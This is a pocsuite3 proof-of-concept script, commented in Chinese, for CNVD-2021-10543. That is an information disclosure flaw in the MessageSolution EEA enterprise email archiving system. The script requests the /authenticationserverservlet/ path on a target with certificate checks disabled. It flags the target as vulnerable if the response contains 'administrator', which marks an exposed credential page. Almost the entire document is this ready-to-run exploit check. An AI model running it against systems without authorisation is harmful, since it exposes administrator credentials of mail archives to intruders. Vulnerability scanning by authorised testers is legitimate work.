from lib2to3.pgen2 import token
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, random_str
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

class DemoPOC(POCBase):
    vulID = '8'  
    name = 'MessageSolution邮件归档系统EEA信息泄露漏洞CNVD-2021-10543'
    desc = '''MessageSolution邮件归档系统EEA信息泄露漏洞CNVD-2021-10543'''
    appPowerLink = 'MessageSolution邮件归档系统'
    appName = 'MessageSolution'
    appVersion = 'MessageSolution 企业邮件归档管理系统EEA'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        target = self.url + "/authenticationserverservlet/"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        }
        try:
            r = requests.get(target, headers=headers, timeout=5,verify=False)
            if r.status_code == 200 and "administrator" in r.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
        except:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)